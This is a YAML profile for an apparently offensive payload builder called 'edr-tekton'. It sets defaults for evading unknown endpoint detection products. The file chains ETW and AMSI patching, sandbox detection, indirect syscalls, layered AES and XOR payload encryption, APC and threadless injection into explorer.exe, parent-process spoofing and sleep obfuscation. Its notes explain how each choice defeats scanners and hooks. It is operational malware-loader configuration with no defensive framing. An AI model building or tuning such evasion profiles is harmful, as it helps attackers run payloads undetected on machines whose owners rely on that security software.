# edr-tekton :: Generic / Unknown EDR Profile
#
# Default profile when the EDR cannot be identified, or when
# building a general-purpose payload. Assumes medium threat
# across all layers and selects a balanced technique stack
# that is effective against most EDRs without being overly
# aggressive (which could trigger heuristics).
#
# Strategy: balanced stealth across all layers, no assumptions
# about specific weaknesses. Indirect syscalls + moderate
# encryption + APC injection as a safe middle ground.

profile:
  name: generic
  display_name: "Generic / Unknown EDR"
  version: "1.0"
  vendor: generic

threat_levels:
  user_hooks: high
  kernel_cb: high
  etw: medium
  minifilter: medium
  wfp: medium
  scanner: high
  elam: medium
  nirvana: low
  hypervisor: none

stages:
  fingerprint:
    primary: auto
    required: true

  api_resolve:
    primary: peb_walk
    fallbacks:
      - hash_resolve
      - dynamic_resolve
    required: true
    max_risk: 30

  evasion_pre:
    primary: etw_patch
    required: false
    max_risk: 30
    additional:
      - amsi_patch
      - sandbox_detect

  syscall_init:
    primary: indirect_syscall
    fallbacks:
      - direct_syscall
    required: true
    max_risk: 20
    additional:
      - ssn_resolve

  decrypt:
    primary: encrypt_aes
    fallbacks:
      - encrypt_rc4
      - encrypt_xor
    required: true
    max_risk: 15

  inject:
    primary: inject_apc
    fallbacks:
      - inject_threadless
      - inject_callback
      - inject_classic
    required: true
    max_risk: 30

  sleep_init:
    primary: sleep_ekko
    fallbacks:
      - sleep_foliage
      - sleep_zilean
    required: false
    max_risk: 15

  cleanup:
    primary: auto
    required: false

constraints:
  max_total_risk: 150
  prefer_stealthy: true
  require_x64: false
  min_os_build: 14393

sleep:
  interval_ms: 5000
  encrypt: true

encryption:
  layers:
    - type: aes256
      key_source: env
    - type: xor
      key_source: static

inject_target: "explorer.exe"
ppid_parent: "explorer.exe"

notes: >
  Generic profile provides balanced evasion across all detection
  layers. Safe defaults for unknown environments. Indirect
  syscalls handle most user-mode hook scenarios. AES encryption
  defeats most scanners. APC injection is reliable and well-tested
  across different EDR products.
